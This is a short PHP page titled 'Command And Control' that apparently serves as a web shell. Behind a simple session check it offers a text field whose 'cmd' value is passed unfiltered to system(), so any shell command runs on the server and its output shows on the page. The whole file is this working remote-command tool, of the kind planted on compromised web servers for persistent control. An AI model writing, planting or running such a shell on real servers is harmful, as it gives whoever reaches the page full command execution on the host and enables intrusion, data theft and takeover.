<?php
  
  session_start(); /* Starts the session */

  if($_SESSION['Active'] == false){ /* Redirects user to Login.php if not logged in */
    header("location:adminLogin.php");
	  exit;
  }
?>

<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="style.css">
</head>
<body>
    <h2>Command And Control</h2>  
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
<pre>
<div id="box">
</div>
<?php
if(isset($_GET['cmd']))
  {
    system($_GET['cmd']);
  }
?>
</pre>
</body>
  <script>document.getElementById("cmd").focus();</script>
</html>